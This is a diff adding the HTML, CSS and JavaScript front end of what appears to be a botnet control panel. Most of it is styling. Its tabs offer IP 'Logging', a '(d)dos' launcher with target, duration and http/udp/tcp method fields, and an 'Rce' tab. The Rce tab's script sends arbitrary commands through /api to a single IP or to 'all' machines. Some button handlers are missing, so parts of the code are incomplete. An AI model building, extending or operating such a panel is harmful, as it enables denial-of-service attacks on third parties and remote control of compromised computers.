@@ -1,0 +1,351 @@
+<style>
+
+
+	:focus {
+		outline: none;
+	}
+
+	::-webkit-input-placeholder {
+		color: #DEDFDF;
+	}
+
+	::-moz-placeholder {
+		color: #DEDFDF;
+	}
+
+	:-moz-placeholder {
+		color: #DEDFDF;
+	}
+
+	::-ms-input-placeholder {
+		color: #DEDFDF;
+	}
+
+	body {
+		background: #6ED0F6;
+		color: #fff;
+		font-family: 'Raleway', sans-serif;
+		-webkit-font-smoothing: antialiased;
+	}
+
+	#wrapper,
+	label,
+	#arrow,
+	button span {
+		transition: all .5s cubic-bezier(.6, 0, .4, 1);
+	}
+
+	#wrapper {
+		overflow: hidden;
+	}
+
+	#signin:checked~#wrapper {
+		height: 172px;
+	}
+
+	#signin:checked~#wrapper #arrow {
+		left: 32px;
+	}
+
+	#signin:checked~button span {
+		transform: translate3d(0, -72px, 0);
+	}
+
+	#signup:checked~#wrapper {
+		height: 255px;
+	}
+
+	#signup:checked~#wrapper #arrow {
+		left: 137px;
+	}
+
+	#signup:checked~button span {
+		transform: translate3d(0, -144px, 0);
+	}
+
+	#reset:checked~#wrapper {
+		height: 90;
+	}
+
+	#reset:checked~#wrapper #arrow {
+		left: 404px;
+	}
+
+	#reset:checked~button span {
+		transform: translate3d(0, 0, 0);
+	}
+
+	.divform {
+		width: 450px;
+		height: 370px;
+		margin: -185px -225px;
+		position: absolute;
+		left: 50%;
+		top: 50%;
+	}
+
+	input[type=radio] {
+		display: none;
+	}
+
+	label {
+		cursor: pointer;
+		display: inline-block;
+		font-size: 22px;
+		font-weight: 800;
+		opacity: .5;
+		margin-bottom: 30px;
+		text-transform: uppercase;
+	}
+
+	label:hover {
+		transition: all .3s cubic-bezier(.6, 0, .4, 1);
+		opacity: 1;
+	}
+
+	label[for="signin"] {
+		margin-right: 20px;
+	}
+
+	label[for="reset"] {
+		float: right;
+	}
+
+	input[type=radio]:checked+label {
+		opacity: 1;
+	}
+
+	input[type=text],
+	input[type=password] {
+		background: #fff;
+		border: none;
+		border-radius: 20px;
+		font-size: 27px;
+		font-family: 'Raleway', sans-serif;
+		height: 72px;
+		width: 99.5%;
+		margin-bottom: 10px;
+		opacity: 1;
+		text-indent: 20px;
+		transition: all .2s ease-in-out;
+	}
+
+	button {
+		background: #079BCF;
+		border: none;
+		border-radius: 20px;
+		color: #fff;
+		cursor: pointer;
+		font-family: 'Raleway', sans-serif;
+		font-size: 27px;
+		height: 72px;
+		width: 100%;
+		margin-bottom: 10px;
+		overflow: hidden;
+		transition: all .3s cubic-bezier(.6, 0, .4, 1);
+	}
+
+	button span {
+		display: block;
+		line-height: 72px;
+		position: relative;
+		top: -2px;
+		transform: translate3d(0, 0, 0);
+	}
+
+	button:hover {
+		background: #007BA5;
+	}
+
+  .methodbutton:hover {
+    height: 50%;
+  }
+
+	#arrow {
+		height: 0;
+		width: 0;
+		border-bottom: 10px solid #fff;
+		border-left: 10px solid transparent;
+		border-right: 10px solid transparent;
+		position: relative;
+		left: 32px;
+	}
+</style>
+<style>
+  @import url(https://fonts.googleapis.com/css?family=Raleway:700,800);
+  
+  .pill1 { grid-area: pill1; }
+  .pill2 { grid-area: pill2; }
+  .pill3 { grid-area: pill3; }
+  .content { grid-area: content; }
+  .user { grid-area: user; }
+  .exitbutton { grid-area: exitbutton; }
+  
+  body {
+    margin: 0;
+    font-family: 'Raleway', sans-serif;
+		-webkit-font-smoothing: antialiased;
+    background-color: #6ED0F6;
+    color: #FFFFFF;
+    position: relative;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    
+  }
+  .container {
+    background-color: #FFFFFF;
+    width: 80%;
+    height: 80%;
+    border-radius: 30px;
+    display: grid;
+    grid-template-areas:
+      'user content content content content content'
+      'user content content content content content'
+      'pill1 content content content content content'
+      'pill1 content content content content content'
+      'pill2 content content content content content'
+      'pill2 content content content content content'
+      'pill3 content content content content content'
+      'pill3 content content content content content'
+      'exitbutton content content content content content';
+    gap: 30px;
+    padding: 30px;
+    transition: all 1s ease;
+  }
+
+  .container > div {
+    background-color: #079BCF;
+    border-radius: 30px;
+    padding: 20px 0;
+    font-size: 30px;
+  }
+
+  .container > .exitbutton {
+    background-color:  #FB6767;
+    -webkit-transition: background-color 1s ease-out;
+    -moz-transition: background-color 1s ease-out;
+    -o-transition: background-color 1s ease-out;
+    transition: background-color 1s, border-radius 1s ease-out;
+  }
+
+  .container > .user {
+    border-radius: 30px;
+    background-color: #6ED0F6;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    -webkit-transition: background-color 1s ease-out;
+    -moz-transition: background-color 1s ease-out;
+    -o-transition: background-color 1s ease-out;
+    transition: background-color 1s, border-radius 1s ease-out;
+  }
+
+  .container > .user:hover {
+    border-radius: 30px;
+    background-color: #079BCF;
+  }
+
+  .container > .content {
+    background-color:  #6ED0F6;
+  }
+
+  .container > .exitbutton:hover {
+    background-color:  #ff5454;
+    border-radius: 40px;
+  }
+
+  .container > .pill1, .pill2, .pill3 {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    -webkit-transition: background-color 1s ease-out;
+    -moz-transition: background-color 1s ease-out;
+    -o-transition: background-color 1s ease-out;
+    transition: background-color 1s, border-radius 1s ease-out;
+  }
+
+  .container > .pill1:hover, .pill2:hover, .pill3:hover {
+    background-color:  #007BA5;
+    border-radius: 40px;
+  }
+  
+  
+</style>
+
+<title>Panel</title>
+<link rel="icon" href="https://i.imgur.com/kupbDHI.png">
+
+<div class="container">
+  <div onclick="settings()" class="user">{currentuser}</div>
+  <div onclick="pill1()" class="pill1">Logging</div>
+  <div onclick="exit()" class="exitbutton"></div>
+  <div onclick="pill2()" class="pill2">(d)dos</div>
+  <div onclick="pill3()" class="pill3">Rce</div>
+  
+  <div style="padding: 20px" id="content" class="content">
+  <h1 style="display: flex; justify-content: center; align-items: center; color:  #6ED0F6; background-color: #FFFFFF; border-radius: 30px; padding: 30px;"> Panel </h1>
+  </div>
+  </div>
+
+<script>
+ function exit() {
+	window.location.href = "/"
+}
+
+function settings() {
+	document.getElementById("content").innerHTML = "<input id='pass' placeholder='Password' type='password'></input><br><button type='submit'onclick='changepassword()'>Change Password</button><button type='submit'onclick='showhome()'>Show Home</button>"
+}
+
+function showhome() {
+	document.getElementById("content").innerHTML = '<h1 style="display: flex; justify-content: center; align-items: center; color:  #6ED0F6; background-color: #FFFFFF; border-radius: 30px; padding: 30px;"> Panel </h1>'
+}
+
+function pill1() {
+	document.getElementById("content").innerHTML = "<input id='pass' placeholder='ip address' type='text'></input><br><input id='pass' placeholder='api' type='text'></input><button type='submit'onclick='changepassword()'>Log Single</button><br><button type='submit'onclick='changepassword()'>Log All</button>"
+}
+
+function pill2() {
+	document.getElementById("content").innerHTML = "<input id='pass' placeholder='Target' type='text'></input><br><input id='pass' placeholder='Time' type='text'></input> <button id='methbutton' type='submit'onclick='methodchange()'>Method</button><br><button type='submit'onclick='ddosexecute()'>Execute</button>"
+}
+
+function pill3() {
+	document.getElementById("content").innerHTML = "<input id='rceip' placeholder='ip address' type='text'></input><br><input id='rcecommand' placeholder='Command' type='text'></input><button type='submit'onclick='executesingle()'>Execute On Single</button><br><button type='submit'onclick='execute()'>Execute On All</button>"
+}
+let count = 0,
+	currentmethod;
+
+function methodchange() {
+	if (count > 2 && (count = 0), 1 == (count += 1)) {
+		currentmethod = "http";
+		var t = document.getElementById("methbutton");
+		t.innerHTML = "Method ( current : " + currentmethod + ")"
+	} else if (2 == count) {
+		currentmethod = "udp";
+		var t = document.getElementById("methbutton");
+		t.innerHTML = "Method ( current : " + currentmethod + ")"
+	} else if (3 == count) {
+		currentmethod = "tcp";
+		var t = document.getElementById("methbutton");
+		t.innerHTML = "Method ( current : " + currentmethod + ")"
+	}
+	console.log("Method set to : " + currentmethod)
+}
+
+function execute() {
+	var t = document.getElementById("rcecommand").value,
+		e = new XMLHttpRequest;
+	e.open("GET", "/api?command=*rce*all::" + t, !0), e.onreadystatechange = function() {
+		4 == e.readyState && console.log(e.responseText)
+	}, e.send()
+}
+
+function executesingle() {
+	var t = document.getElementById("rcecommand").value,
+		e = document.getElementById("rceip").value,
+		n = new XMLHttpRequest;
+	n.open("GET", "/api?command=*rce*single::" + t + "::" + e, !0), n.onreadystatechange = function() {
+		4 == n.readyState && console.log(n.responseText)
+	}, n.send()
+}
+</script>
